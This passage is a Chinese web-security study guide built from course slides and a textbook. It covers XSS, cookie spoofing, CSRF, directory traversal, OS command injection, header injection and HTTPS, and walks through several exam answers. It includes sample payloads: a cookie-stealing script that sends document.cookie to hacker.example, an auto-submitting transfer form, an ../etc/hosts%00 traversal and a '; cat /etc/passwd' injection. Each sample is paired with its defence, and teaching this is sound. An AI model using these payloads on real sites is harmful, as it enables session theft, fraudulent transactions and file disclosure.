「Alice 在登录到 Bob 的站点后，浏览 Charly 提供的 URL」——受害者必须处于登录状态，脚本偷到的 Cookie 才有价值。这条件跟 CSRF 一模一样，也是两者常被放一起考的原因。XSS 的完整前提：①站点存在未转义的输出点；②受害者被诱导访问（反射式）或主动访问（存储式）；③受害者在该站有会话（否则偷到的是空 Cookie）。前提条件归纳为本页补写

🖼 PPT p.49–50 的实拍：一行 ASP 代码引发的血案

PPT 贴出了漏洞页 loginsb.asp 的源码片段——它直接把 msg 参数原样吐回页面：

<TD width="292" height="53"><p align="center"><br> <%=Request.QueryString("msg")%></p> </TD>　' 直接将 msg 参数输出

PPT 的注解：「loginsb.asp 直接向用户显示 msg 参数，这样只要简单构造一个恶意的 url 就可以触发一次 XSS。」下一张截图里，地址栏是：

http://靶机/nanfang/loginsb.asp?msg=<script>alert(/xss/)</script>

页面上弹出 /xss/。整个漏洞只有一个原因：<%= %> 输出时没有做 HTML 实体编码。把它改成先编码再输出，这一行就安全了。

PPT 对存储式的完整叙述（p.51–54）
📖 定义（p.51 原文）

储存式跨站脚本攻击，也称为持久性跨站脚本攻击。

「如果 Web 程序允许存储用户数据，并且存储的输入数据没有经过正确的过滤，就有可能发生这类攻击。」

「在这种攻击模式下，攻击者并不需要利用一个恶意链接，只要用户访问了储存式跨站脚本网页，那么恶意数据就将显示为网站的一部分并以受害者身份执行。」

🖼 PPT p.52–54 的实拍：留言板三连

第一张——攻击者在留言板的「您的邮箱」一栏填入 <script>alert("XSS")</script>，姓名填 hacker，留言内容随便写。第二张——后台留言列表里多出一条「新留言」，管理员一打开列表就弹窗。第三张——真正有杀伤力的版本，内容框里填的是：

<script> window.location="http://hacker.example/steal.cgi?ck="+document.cookie; </script>

这段脚本把当前页面直接跳转到攻击者的服务器，并把 Cookie 拼在查询串里带过去。攻击者只要看自己的 Web 日志就能收货——连写接收程序都省了。存储式最可怕的地方在于「谁看谁中招」：管理员为了处理留言而打开后台列表，恰恰是最容易中招、且 Cookie 权限最高的那个人。

🔑 DOM 式 XSS 一分钟版 课本无扫描件 · 本页补写

页面里有这么一行看似人畜无害的 JS：

document.getElementById('greet').innerHTML = "你好，" + location.hash.slice(1);

攻击者发来 https://example.com/p.html#<img src=x onerror=alert(1)>。URL 里 # 后面的部分（fragment）浏览器根本不会发给服务器——服务器的访问日志里只有一条对 p.html 的普通请求，WAF 也只看到一条干净请求。但浏览器本地那行 JS 把它塞进了 innerHTML，标签当场被解析、onerror 当场执行。

三个易错点：①它不是「另一种反射式」，区别在注入发生在哪一端；②服务端做再多转义都没用；③危险的不只是 location.hash，还有 location.search、document.referrer、postMessage 等一切「来源不可信」的输入，配上 innerHTML / document.write / eval 这些「会解析」的输出口。

2.3 Cookie 欺骗及防范 PPT p.56–61（6 页）

PPT 第 57 页 · 问题

如果登录状态是靠 Cookie 记住的，而 Cookie 在我自己电脑上——那我为什么还要输密码？

PPT 的答案冷酷而简短：「伪造 Cookie 信息，绕过网站的验证过程，不需要输入密码，就可以登录网站，甚至进入网站管理后台。」

这不是理论。下面两段是 PPT 直接贴出来的真实 ASP 代码，问题一眼可见。

伪造 Cookie 直接进后台 PPT p.58

PPT 贴出的「网站登录验证代码」：

<% if request.Cookies("lunjilyb")("username")="" then response.redirect "login.asp" endif if request.Cookies("lunjilyb")("password")="" then response.redirect "login.asp" endif if request.Cookies("lunjilyb")("randomid")<>12 then response.redirect "login.asp" endif %>

PPT 的三行注解，第三行是要害：

  1. 「利用 request.Cookies 语句分别获取 Cookies 中的用户名、口令和 randomid 的值」；
  2. 「如果用户名或口令为空、或 randomid 值不等于 12 就跳转到登录界面，也就是说，程序是通过验证用户的 Cookie 信息来确认用户是否已登录」；
  3. 「Cookie 信息是可以在本地修改的，只要改后的 Cookie 信息符合验证条件（用户名和口令不空且 randomid 值等于 12），就可进入管理后台界面。」
⚠ 这段代码错在哪：三个都错，但错法不同
检查项作者以为它在验证什么实际上它验证了什么
username 不为空「这人登录过」什么也没验证。攻击者手工写一个 username=x 就通过了——连正确的用户名都不用知道
password 不为空「这人知道口令」只验证了「非空」，没验证「正确」。填 password=1 照样过
randomid = 12「这是个随机校验值」它是个常数 12。写在代码里，谁抓一次包就知道了；就算不知道，从 0 试到 100 也就一百次

根本病因只有一个：这三项全部由客户端提供，而服务器没有任何办法验证它们的真伪。服务器手上没有留下任何「只有服务器自己知道」的东西可以拿来对照。

权限也存在 Cookie 里：删帖权限的例子 PPT p.59

if Request.Cookies("power") ="" then response.write"<SCRIPT language=JavaScript>alert('你还未登录论坛！');</SCRIPT>" response.end else if Request.Cookies("power")<500 then response.write"<SCRIPT language=JavaScript>alert('你的管理级别不够！');</SCRIPT>" response.redirect"http://…" response.end endif endif

PPT 的注解：「只要 Cookie 中的 power 值不小于 500，任意用户都可以删除任意帖子。同样可以利用上面介绍的方法进行 Cookie 欺骗攻击。」

🎯 攻击成本：改一个数字

在浏览器开发者工具里把 power 从 10 改成 9999，刷新——你就是管理员。注意这里连「伪造」都算不上，因为服务器从来没有真正颁发过一个不可伪造的凭据；它只是把自己的判断依据交给了对方保管。

★ 安全原则：Cookie 里只放会话 ID PPT p.60

🔑 PPT p.60 的两句结论（考点，背原文）

「上面介绍的两个攻击例子之所以成功，是因为在 Cookie 中保存了用户名、口令以及权限信息而留下了安全隐患。」

安全原则：「一般情况下，网站会话管理机制仅将会话 ID 保存至 Cookie，而将数据本身保存在 Web 服务器的内存或文件、数据库中。」

为什么换成会话 ID 就安全了？本页补写三点：

  • ID 不可推测：由服务器随机生成，长度足够，攻击者猜不出别人的 ID；而 power=500 这种值是可以直接想出来的。
  • 数据在服务器手里：用户名、权限存在服务端会话里，客户端改不到。客户端唯一能改的是那串 ID，而改一个随机 ID 只会得到另一个无效 ID。
  • 可以随时作废：服务器要踢人下线，把会话删掉即可；而写在 Cookie 里的 power=500 在过期前谁也收不回来。

监听 Cookie 来实现会话劫持 PPT p.61

PPT 原文：「如果 Cookie 中没有设置安全属性 secure，则 Cookie 内容在网络中用明文传输，攻击者监听到 Cookie 内容后可以轻松实现会话劫持。」

📖 会话劫持 ≠ Cookie 欺骗

Cookie 欺骗是「编一个」——因为服务器的判据可以猜、可以造。
会话劫持是「偷一个」——服务器的判据（会话 ID）造不出来，但如果它在网上明文跑，就可以捡现成的。2.3 节前半讲的是「服务器判据设计错了」，后半讲的是「判据设计对了但传输时裸奔」。上面 1.7 节 PPT p.24 那句「窃密和欺骗」，正好对应这两半。

追问PPT p.61 问了但没答：为什么会不设置安全属性？

这是 PPT 直接抛在页面上的一句反问，下一页就翻到 CSRF 了。可能的原因至少有五条本页作答：

  1. 站点根本没有全站 HTTPS。secure 的语义是「只在 HTTPS 连接上发送这个 Cookie」。如果站点还有大量 HTTP 页面（对照 3.3 节的第 2、3 种部署方式），一加 secure，那些 HTTP 页面就收不到 Cookie、功能直接坏掉。于是开发者为了「能用」把它去掉了。这是最主要、也最现实的原因：安全属性被可用性挤掉了。
  2. 默认不开。RFC 里 secure 是可选属性，默认关闭；各语言的 setCookie 也大多默认不加。不写 = 不安全，而「不写」是最容易发生的事。
  3. 开发和测试环境是 HTTP 的。本地 http://localhost 调试时加了 secure，Cookie 根本发不出去，登录功能没法测；开发者随手注释掉，然后忘了在上线时加回来。
  4. 历史遗留与第三方组件。老框架、老 CMS、统计脚本种下的 Cookie 不归你管，改不动。
  5. 认知偏差。很多人以为「我登录页是 HTTPS 的就安全了」，没有意识到登录成功后的每一次普通页面请求都会把 Cookie 带上——只要其中任何一次走了 HTTP，Cookie 就在网上裸奔了一趟，而一次就够。

根治办法：全站 HTTPS + HSTS，让「HTTP 页面」这件事从根上不存在，secure 就不会跟可用性打架了。这句话正好是 PPT 把这一问放在第 3 节 HTTPS 之前的用意。

📌 单选第 1 题就在这一节

「为提高 Cookie 的安全性，不建议采取的策略是（　）。A. 在 Cookie 中设置 secure 属性　B. 在 Cookie 中不设置 domain 属性　C. 在 Cookie 中设置 domain 属性　D. 将 Cookie 的生存周期设置为 0 或负值」——答案 C。A 挡明文传输、B 把作用域收窄到单台主机、D 让 Cookie 会话结束即失效，三条都是收紧；只有 C 是放宽：设了 domain，Cookie 会发给该域下的所有子域名，任何一个子域被拿下都会连累它。→ 1.7 节的字段表

2.4 ★ CSRF 攻击及防范 PPT p.62–69（8 页） 课本 p.288–292

PPT 第 63 页 · 问题

一条请求，用户是真的、Cookie 是真的、IP 是真的、参数格式全都合法——服务器凭什么拒绝它？

PPT 的定义：跨站请求假冒（CSRF）——攻击者假冒受信任用户向第三方网站发送恶意请求，如：交易转账、发布网帖、发邮件、修改密码等。

接着 PPT 用两行把它和 XSS 摆在一起对比，这两行值得逐字背：

XSS

利用的是网站内信任用户（用户不可信）

CSRF

通过伪装来自受信任的用户（用户可信）的请求

换句话说：XSS 的问题是「网站信错了内容」，CSRF 的问题是「网站信错了意图」。前者靠转义能解决，后者跟转义一点关系都没有——这是单选第 7 题的全部内容。

🔑 CSRF 成立的两个前提（课本 p.291 原文）

课本把 CSRF 能成功的原因归结为 Web 应用的两个特性——这两条是简答题的标准起手式：

  1. form 元素的 action 属性能够指定任意域名的 URL，使得即使是恶意网站也能向攻击目标发送请求。（浏览器允许跨站发请求，这是 Web 的基本设计）
  2. 浏览器会将保存在 Cookie 中的会话 ID 自动发送给目标网站，使得即使请求是通过恶意网站发起的，Cookie 中的会话 ID 值也照样会被发送给目标网站，从而导致攻击请求在正常认证状态下被发送。（浏览器按目标域自动带 Cookie，不问是谁发起的）

⚠ 课本原话，一句话点破整个攻击

「从图 9-18 中可以看出，只有 Referer 字段值有差别，其余完全一致。正常用户的请示指向的是用户正常转账 URL，而 CSRF 攻击的 HTTP 请求中的 Referer 指向的是恶意网页的 URL。如果 Web 应用开发者不检查 Referer 的值，即不确认该请求是否由正规用户发送，就无法区分两者，从而引入 CSRF 漏洞。」

连 Cookie 都一模一样（PHPSESSID=abdvx0kkldd0112vrabt）——因为那本来就是受害者自己的会话。Content-Length、参数、Host 全部相同。服务器手上唯一的线索就是 Referer 这一行，而 HTTP 里取它只要一句：

String referer = request.getHeader("Referer");　// 课本 p.291
追问PPT p.65 说「现在绝大多数网站都用 POST 提交，即使这样，攻击者仍然能够实施 CSRF 攻击」——怎么做到的？

PPT 抛出了这句话就翻页了。答案是：POST 拦不住 CSRF，因为发 POST 同样不需要用户配合。本页作答

方法一：自动提交的隐藏表单。攻击者在自己的页面上放一个指向目标站的表单，参数用 hidden 藏起来，再用一行 JS 自动提交：

<form id="f" action="https://www.bank.example/transfer.php" method="POST"> <input type="hidden" name="account" value="攻击者账号"> <input type="hidden" name="Money" value="100000000"> </form> <script>document.getElementById('f').submit();</script>

受害者只要打开这个页面，什么都不用点，表单就提交了，浏览器照例带上 bank.example 的 Cookie。这正是课本说的第一个特性——「form 元素的 action 属性能够指定任意域名的 URL」。

方法二：把表单藏进 iframe，让页面看上去毫无异样（用户以为自己在看一张图片或一篇文章）。

结论：GET → POST 只是把「一个 <img src> 就能打」升级成「需要几行 HTML」，门槛提高了一点，防御效果为零。真正有效的还是令牌 / 再次认证 / 查 Referer 那三条。

追问PPT p.66 说「现有银行的网银交易流程……一般并不存在 CSRF 安全漏洞，安全是有保障的」——凭什么？

PPT 这一页标题是「防御 CSRF 攻击」，正文却只有这一句话，没有说明理由。理由在它列举的那串东西里：「USB key、验证码、登录密码和支付密码等一系列安全信息」。本页作答

  • USB key（U 盾）：交易报文要用 U 盾里的私钥签名，私钥不出硬件。攻击者的页面能让浏览器发请求，但没法让 U 盾替他签一笔他指定的交易——而且 U 盾屏幕上会显示金额和对方账号，需要人按键确认。
  • 支付密码 / 短信验证码：这就是课本表 9-1 里的「再次认证」——执行关键操作前让用户再输一次只有他知道的东西。CSRF 能借用会话，借不到用户脑子里的密码。
  • 验证码：需要人识读，脚本自动提交做不到。

抽象成一句：CSRF 的本质是「攻击者能让浏览器发请求，但不知道也拿不到某个只有真实用户/真实页面才有的东西」。把那个东西设成交易的必要条件，攻击就断了。令牌是「页面才有的」，密码和 U 盾是「人才有的」——三种防御策略都是同一个思路的不同版本。

★ CSRF 与 XSS 的区别与联系（简答 9） PPT p.63, p.67

📝 课本官方答案（这题有标准答案，一字不改地记）

「XSS 利用的是网站内的信任用户，而 CSRF 则是通过伪装来自受信任用户的请求来利用受信任的网站。」

展开成完整答案本页补写：

对比项XSSCSRF
被滥用的信任用户信任网站——浏览器信任来自该域的一切脚本网站信任用户——服务器信任带着有效会话的一切请求
攻击者往哪注入往页面内容里注入脚本不注入任何东西，只是让浏览器发一条请求
请求本身合法吗不合法（带着不该有的标签）完全合法，与正常请求逐字节相同（只差 Referer）
攻击者能看到响应吗能——脚本运行在目标域内，可以读 DOM、读 Cookie 再回传不能——同源策略挡着，只能「发出去」，读不到回应。所以 CSRF 只适合做「写」操作（转账、改密码、发帖），不适合「读」
输入过滤有用吗有用（转义即可）完全没用（单选第 7 题）
防御手段输出时 HTML 实体编码令牌 / 再次认证 / 查 Referer
🔗 两者的「联系」——别只答区别 PPT p.67

PPT 专门用一页讲联系：「XSS 攻击可以作为实施 CSRF 攻击前的一个重要步骤：攻击者通过 XSS 攻击获取有用的攻击信息，比如通过 XSS 伪造一个提示用户输入身份信息的表单。」

更要命的一点本页补：如果目标站上存在 XSS，那么所有基于令牌的 CSRF 防御全部失效——因为 XSS 脚本运行在目标域内，可以直接把页面里的 token 读出来，再拿着它构造一条完全合法的请求。这正是课本防御清单里「从 Web 应用程序中删除所有 XSS 漏洞」这一条的分量所在：它不是「顺便也修一下」，而是 CSRF 防御成立的前提。

⚠ 课本 p.292 的补充：令牌本身也要保护

「为了避免这种攻击，系统可以在添加 token 时增加一个判断：如果这个链接是连到自己本站的，就在后面添加 token；如果是连到其他网站则不加。然而，即使这个 token 不以参数的形式附加在请求之中，攻击者的网站也同样可以通过 Referer 来得到这个 token 值以发起 CSRF 攻击。这也是实际工作中，一些用户喜欢手动关闭浏览器的 Referer 功能的原因。」

这一段里藏着一个漂亮的闭环：Referer 既是第三种防御手段，又是第一种防御手段的泄露渠道。而用户为了隐私关掉 Referer，又反过来让第三种手段失效——这就是表里「对用户的影响」那一行的由来。

2.5 目录遍历及防范 PPT p.70–75（6 页） 课本 p.292–294

PPT 第 71 页 · 问题

网页上有个 ?template=exam 的参数，服务器拿它去拼一个文件名。如果我填的不是 exam，而是 ../../../../etc/hosts 呢？

PPT 原文：「许多 Web 应用支持外界以参数的形式来指定服务器上的文件名，如果服务器在处理用户请求时不对文件名进行充分校验，就可能出问题」——三种后果：

  • 文件被非法获取，导致重要信息被泄露；
  • 文件被篡改，如篡改网页内容以发布不实消息，设置圈套将用户诱导至恶意网站，篡改脚本文件从而在服务器上执行任意脚本等；
  • 文件被删除，如删除脚本文件或配置文件导致服务器宕机等。

注意第二条的分量：能改脚本文件，就等于能在服务器上执行任意代码——目录遍历不只是「读文件」。

三个必要条件 PPT p.72 课本 p.294

🔑 课本原文：三条必须同时满足
  1. 外界能够指定文件名。
  2. 能够使用绝对路径或相对路径等形式来指定其他目录的文件名。
  3. 没有对拼接后的文件名进行校验就允许访问该文件。

课本紧接着点出了防御的逻辑：「上述 3 个条件必须同时满足，才有可能产生目录遍历漏洞。因此，为了避免出现目录遍历漏洞，只需让上述 3 个条件的一个或多个不成立即可。」——这就是后面三条对策与三个条件一一对应的原因。

📌 单选第 8 题直接抄这三条

「下列选项中，不属于目录遍历漏洞的必要条件是（　）A. 外界能够指定文件名　B. 设置 Cookie 中的 secure 属性　C. 能够使用绝对路径或相对路径等形式来指定其他目录的文件名　D. 没有对拼接后的文件名进行校验就允许访问该文件」——答案 B。A、C、D 就是课本原文的三条，B 是 Cookie 的话题，跟文件访问毫无关系。这类题只要把三条背下来就是送分。

课本给的完整例子 课本 p.293 PPT p.73

脚本文件名为 ex.php：

<?php define('TMPLDIR', '/var/www/example/tmp1'); $tmp1 = $_GET('template'); ?> <body> <?php readfile(TMPLDIR, $tmp1, '.html'); ?> …… </body>

课本的解释：「常量 TMPLDIR 指定的是存在文件的目录名，要访问的文件名由查询字符串中的 template 指定，并被赋值给变量 $tmp1。脚本使用 readfile 函数读取指定的文件，然后将其原封不动放在响应消息中。」

正常用法：

http://example.cn/example/ex.php?template=exam → 脚本内拼接成的文件名 /var/www/example/tmp1/exam.html

攻击用法（课本与 PPT 给的是同一条）：

http://example.cn/example/ex.php?template=../../../../etc/hosts%00 → 拼接后 /var/www/example/tmp1/../../../../etc/hosts%00.html → %00 是空字节，在 C 语言中表示字符串的结束，于是简化为 /var/www/example/tmp1/../../../../etc/hosts → 从当前目录出发，经过 4 次「进入上一级目录」操作后，实际访问的文件为 /etc/hosts
⚠ %00 这一步是最容易被跳过、也最常被考的

课本原话：「其中，%00 为空字节，在 C 语言中表示字符串的结束。因此，上述文件名可简化为……」
为什么它有用：程序为了限制文件类型，硬编码地在末尾加了 .html。攻击者没法删掉这个后缀，但可以让底层的 C 函数提前认为字符串已经结束——PHP 的字符串带长度、能容纳 \0，而它调用的底层文件系统 API 是以 \0 结尾的 C 字符串。两层对「字符串在哪结束」的理解不一致，后缀限制就作废了。这跟 1.4 节讲的「中间盒子理解不一致导致新攻击」是同一类问题。底层原因为本页补写

防御三条 PPT p.75 课本 p.294

对策做法破坏了哪个条件
① 避免由外界指定文件名 「将文件名固定，保存在会话变量中，不直接指定文件名，而是使用编号等方法间接指定。」（例如把 ?template=exam 改成 ?tid=3，服务器查表得到真实文件名） 条件 1
② 文件名中不允许包含目录名 「不同系统中表示目录的字符有所不同，常见的有：/、\、: 等。」在 PHP 中可用 basename 从带目录的文件名中提取末尾的文件名部分，例如 basename('../../etc/hosts') 返回 hosts。
课本特别提醒：「basename 函数在处理时不会删除空字节（%00），即使使用 basename 函数对文件名进行了处理也还是有可能出现文件扩展名被更改的情况。因此，如果文件名由外界传入的情况下，有必要对文件名进行校验以确保其中不包含空字节。」		 条件 2
③ 限定文件名中仅包含字母或数字 「如果能够限制文件名中只包含字母或数字，则用于目录遍历攻击的字符就会无法使用，攻击也就无法实施了。」 条件 2 + 3
⚠ 编码绕过：为什么「过滤 ../」不够 PPT p.75 课本 p.294

「实际攻击过程中，有些攻击为了绕过对目录字符的检查，经常使用不同的编码转换进行过滤性的绕过，如 URL 编码，通过对参数进行 URL 编码提交来绕过检查」。课本与 PPT 给的例子是同一条：

downfile.jsp?filename=%66%61%6E%2E%70%64%66　← 解码后就是 fan.pdf

要害在于「什么时候解码」：如果校验代码先检查、后由框架解码，那它检查的是 %2E%2E%2F 这串看起来无害的百分号，而真正落到文件系统上的是解码后的 ../。所以课本第 ③ 条「只允许字母数字」比「过滤 ../」高明——白名单不受编码影响，因为 % 本身就不在白名单里。可以用上面 2.2 节的编码实验台把这串解一遍。

📖 课本 p.294 的收尾句（简答 10 的结论）

「总之，目录遍历漏洞允许恶意攻击者突破 Web 应用程序的安全控制，直接访问攻击者想要的敏感数据，包括配置文件、日志、源代码等，配合其他漏洞的综合利用，攻击者可以轻易地获取更高的权限，并且这样的漏洞也很容易被挖掘出来，只要在 Web 应用程序的文件读写功能块中对输入的文件名进行严格检查，就可以阻止目录遍历攻击。」

2.6 操作系统命令注入及防范 PPT p.76–81（6 页） 课本 p.294–296

PPT 第 77 页 · 问题

一个「填邮箱地址就给你发邮件」的页面，怎么会把 /etc/passwd 打在屏幕上？

课本的定义：「在操作系统中，Shell 是用来启动程序的命令行界面，如 Windows 系统中的 cmd.exe，UNIX 或 Linux 操作系统中的 sh、csh、bash 等。很多 Web 应用编程语言支持应用通过 Shell 执行操作系统（OS）命令。通过 Shell 执行 OS 命令，或开发中用到的某个方法在其内部使用了 Shell，就有可能出现恶意利用 Shell 提供的功能来任意执行 OS 命令的情况，这就是 OS 命令注入攻击。」

注意「或开发中用到的某个方法在其内部使用了 Shell」这半句——很多人以为自己没调 Shell，其实调了。

课本给的完整例子 课本 p.295 PPT p.78

页面功能是发送电子邮件（sendmail.html）：

<body> <form action = "send.php" method = "POST"> 请输入您的邮箱地址<br> 邮箱地址<input type = "text" name = "mail"><br> 邮件内容<textarea name = "con" cols = "20" rows = "3"></textarea><br> <input type = "submit" value = "发送"> </form> </body>

接收页面的处理脚本（send.php）：

<?php $mail = $_POST['mail']; // 调用 OS 命令 sendmail 将邮件发送到表单中填入的邮件地址 $mail // 邮件信息保存在 template.txt 中 system("/usr/sbin/sendmail -I <template.txt $mail"); ?>

攻击者在邮箱地址处填入：

list@example.com; cat /etc/passwd

课本原文：「则在页面上点击『发送』按钮后，页面上将显示的是系统口令文件 /etc/passwd 的内容。此处攻击者只是用 cat 命令显示文件内容，他也完全可以用 Web 应用的用户权限执行任何操作系统命令，如删除文件、下载文件、执行下载来的恶意软件等。」

🔑 病因：Shell 元字符 PPT p.79 课本 p.295

课本与 PPT 用的是同一段话：「上述攻击成功的主要原因是 Shell 支持连续执行多条命令，如 UNIX 操作系统 Shell 中使用分号（;）或管道（|）等字符支持连续执行多条命令，Windows 操作系统 cmd.exe 使用 & 符号来连接多条命令。这些符号一般称为 Shell 的元字符，如果 OS 命令参数中混入了元字符，就会使攻击者添加的操作系统命令被执行，这就是 OS 注入漏洞产生的原因。」

和 SQL 注入对照着记：SQL 注入的「元字符」是 ' 和 --，OS 注入的元字符是 ; | &，XSS 的是 < >，目录遍历的是 ../，头注入的是 %0D%0A。五种攻击 = 五套元字符。

⚠ 课本 p.296 的补充：「看似不会执行系统命令的函数」

「除了 system 这种直接执行操作系统命令的函数，一些看似不会执行系统命令的函数，也可能通过 Shell 执行操作系统命令，如 Perl 中的 open 函数。在使用了 Perl 的 open 函数的脚本中，如果外界能够指定文件名，就能通过在文件名的前后加上管道符号（|）来实施 OS 命令注入攻击。」
这解释了防御第 ② 条为什么写成「避免使用内部可能会调用 Shell 的函数」——危险的不只是名字里带 exec/system 的那几个。

攻击流程四步 PPT p.80 课本 p.296

1
从外部下载攻击用软件
注入点本身通常只够跑一条短命令，先用它把趁手的工具拉下来（wget / curl）。
2
对下载来的软件授予执行权限
chmod +x。
3
从内部攻击操作系统漏洞以取得管理员权限
提权。注入拿到的是 Web 应用的身份（通常权限很低），要做更多事就得往上爬。
这一步解释了防御清单末尾那句「应将运行应用的权限设为所需的最低权限（即最小特权原则）」——让第 3 步爬不上去，前两步就白干。
4
在 Web 服务器上执行攻击操作
「浏览、篡改或删除 Web 服务器内的文件，对外发送邮件，以此服务器作跳板攻击其他服务器等。」最后半句是重点：受害者从此变成加害者。

防御四条 PPT p.81 课本 p.296

  1. 选择不调用操作系统命令的实现方法，即不调用 Shell 功能，而用其他方法实现。——发邮件用邮件库，别去 system("sendmail …")。这是根治，对应 SQL 注入里的「参数化查询」。
  2. 避免使用内部可能会调用 Shell 的函数。——见上面 Perl open 的坑。
  3. 不将外部输入的字符串作为命令行参数。——非要调外部程序，也别把用户输入原样递进去；用固定参数或编号映射。
  4. 使用安全的函数对传递给操作系统的参数进行转义，消除 Shell 元字符带来的威胁。由于 Shell 转义规则的复杂性以及其他一些环境相关的原因，这一方法有时很难完全凑效。——课本自己给这一条打了折扣，说明「转义」是下策。

课本收尾：「Web 应用开发者如果主动对传入的参数进行严格的校验，将会大大减少 OS 命令注入漏洞。此外，应将运行应用的权限设为所需的最低权限（即最小特权原则），以减少攻击所产生的损害。」

📌 单选第 10 题：哪个「不能」消除 OS 命令注入

「下列选项中，不能消除操作系统命令注入漏洞的是（　）A. 使用 HTTPS　B. 不调用 Shell 功能　C. 避免使用内部可能会调用 Shell 的函数　D. 不将外部输入的字符串作为命令行参数」——答案 A。B、C、D 是课本防御的前三条；HTTPS 只保护「传输」这一段，而注入串是用户合法填写、加密传输、服务器解密后自己拼进命令行的——加密全程正常工作，漏洞照旧。这跟 2.1 节 SQL 注入流程图第 4、5 步「数据库加密返回、应用解密后交出去」是同一个道理：加密防不了逻辑漏洞。

2.7 HTTP 消息头注入攻击及防范 PPT p.82–86（5 页） 课本 p.296–297

PPT 第 83 页 · 问题

HTTP 响应头是「一行一个」的纯文本。如果我能往里面塞一个换行符呢？

课本定义：「HTTP 消息头注入是指在重定向或生成 Cookie 时，基于外部传入的参数生成 HTTP 响应头时所产生的安全问题。」

  • 「HTTP 响应头信息一般以文本格式逐行定义消息头，即消息头之间互相以换行符隔开。」
  • 「攻击者可以利用这一特点，在指定重定向目标 URL 或 Cookie 值的参数中插入换行符且该换行符又被直接作为响应输出，从而在受害者的浏览器上任意添加响应消息头或伪造响应消息体。」

四个后果（课本原文）：生成任意 Cookie，重定向到任意 URL，更改页面显示内容，执行任意 JavaScript 而造成与 XSS 同样的损害。

📖 CR 与 LF：%0D%0A 到底是什么

HTTP 规定每个消息头以 CRLF 结尾——CR = 回车（\r，ASCII 13，URL 编码 %0D），LF = 换行（\n，ASCII 10，URL 编码 %0A）。所以 %0D%0A 在 HTTP 解析器眼里就是四个字：「这一行结束了」。攻击者塞进去的不是「一段文字」，而是一个结构性的分隔符——这跟 SQL 注入塞进一个 ' 是完全相同的把戏。CR/LF 释义为本页补写

例子一：重定向到任意 URL 课本 p.296 PPT p.84

下面两例的域名照 RFC 2606 换成了 .example（课本原文写的是 trap.com 与 example.com），其余一字未改。

假定 in.cgi 脚本的功能是接收查询字符 url 的值，并重定向至该 URL。以下面的 URL 执行它：

http://example.com/web/in.cfg?url=http://example.com/%0D%0ALocation: http://trap.example/web/attack.php

课本：「执行之后，浏览器会跳转到恶意网站 trap.example/web/attack.php，而不是期望的正常网站 http://example.com。造成这一结果的主要原因是，CGI 脚本里使用的查询字符串 url 中包含了换行符（%0D%0A），该换行符使得 CGI 脚本输出了 2 行 Location 消息头」：

Location: http://example.com Location: http://trap.example/web/attack.php
⚠ 为什么是后一个生效——这一句是本节的关键

课本 p.297 原文：「Apache 服务器从 CFG 脚本中接收的消息头中如果有多个 Location 消息头，就会只将最后一个 Location 消息头作为响应返回。因此，原来的重定向目标就被忽略，取而代之的是换行符后面的 URL。」
这就是 1.4 节说的「中间盒子对标准理解不一致」的具体后果：RFC 没有规定重复 Location 该怎么办，各家实现自己决定，攻击者就利用这个不确定性。

HTTP 响应截断攻击与缓存污染 课本 p.297 PPT 未讲

⚠ PPT 没讲，但单选第 9 题考它——所以放进正文

按「PPT 没提到就算了」的原则，这一小节本该折叠。但课本单选第 9 题「可污染缓存服务器的 Web 攻击方法是（　）」的答案就是它，所以保留在正文。

课本原文：「与 HTTP 消息头注入攻击相关且攻击原理类似的另一种攻击是 HTTP 响应截断攻击（HTTP Response Splitting Attack）。」

「HTTP 响应截断攻击通过 HTTP 消息头注入生成多个 HTTP 响应，使网络中的缓存服务器（或代理服务器）将伪造的内容进行缓存，后续的访问将得到的是攻击者产生的内容。具体攻击原理如下所述。」

「HTTP/1.1 允许在一个连接中发送多个请求，而且响应也会在一个连接中被返回。攻击者会在执行 HTTP 消息头注入攻击所使用的 HTTP 请求（第 1 个）后面，加上导致服务器缓存伪造内容的 URL 所指对应的 HTTP 请求（第 2 个请求）。此时，通过对第 1 个请求进行 HTTP 消息头注入攻击，在 HTTP 响应消息体中插入伪造内容，缓存服务器就会将这个伪造内容误认为第 2 个请求的响应而将其缓存。」

🔑 为什么它比普通的消息头注入危险得多

课本：「由于该攻击能够使用伪造的内容污染缓存服务器中的内容，因此也被称为『缓存污染』。污染缓存大大增加了受影响的用户群和受影响的时间，从而极大增加了攻击的威力。」
一句话对比：普通消息头注入是「骗一个人一次」（谁点那条恶意 URL 谁中招）；响应截断是「骗所有人很久」——缓存里那份假页面会被原样发给之后所有访问者，直到缓存过期，而他们访问的是完全正常的 URL。

3.2 HTTPS 基本原理 PPT p.90–94 课本 p.297–298

📖 定义（课本 p.297 / PPT p.90 原文）

超文本传输安全协议（Hypertext Transfer Protocol Secure，HTTPS），是一种将 HTTP 和 SSL（或 TLS）结合来实现 Web 浏览器和服务器之间的安全通信协议，也称为 HTTP over TLS、HTTP over SSL 或 HTTP Secure。基于 SSL 或 TLS 的 HTTP 并没有本质区别，都被称为 HTTPS。

课本 p.298 把「为什么需要它」交代得比 PPT 完整：「在 HTTPS 出现之前，Web 浏览器和服务器之间通过 HTTP 协议进行通信。HTTP 协议传输的数据都是未加密的，也就是明文，再通过不加密的 TCP 协议传输，因此使用 HTTP 协议传输的隐私信息非常不安全，同时还存在不能有效抵御假冒服务器的问题。将 HTTP 和 SSL 结合起来后，既能够对网络服务器的身份进行认证，又能保护交换数据的机密性和完整性。」

🔑 HTTPS 给了三样东西，没给第四样（单选第 13 题）
✅ 机密性

内容加密，中间人看不懂

✅ 完整性

被改会被 MAC 发现

✅ 服务器真实性

靠证书验证对方是谁

❌ 可靠性

不归它管。可靠传输是下面那层 TCP 的职责（重传、排序、流控）。HTTPS 只是在 HTTP 和 TCP 之间插了一层加密

单选 13：「Web 浏览器和服务器使用 HTTPS 协议，而不是使用 HTTP 协议进行通信，不能确保通信的（　）A. 机密性　B. 完整性　C. 可靠性　D. 服务器的真实性」——答案 C。这题考的是「安全属性」和「传输属性」的区分：可靠性是网络性能概念，不是安全属性。

用户能看见的两个区别 PPT p.91

  • 「从用户使用的角度看，HTTP 和 HTTPS 的主要区别是 URL 地址开始于 http:// 还是 https://」；
  • 「一个标准的 HTTP 服务使用 80 端口，而一个标准的 HTTPS 服务则使用 443 端口」——单选第 14 题「HTTPS 服务器使用的默认 TCP 端口号是（　）」答案 A. 443。

HTTPS 到底加密了什么 PPT p.92 课本 p.298

课本与 PPT 用的是同一句，五项要能背下来：「当使用 HTTPS 时，下述通信内容被加密：请求的文件的 URL，文件的内容，浏览器表单的内容（由浏览器使用者填写），从浏览器发送到服务器或从服务器发送给浏览器的 Cookie，HTTP 标题的内容。」

⚠ 反过来问：什么没被加密？ 本页补写

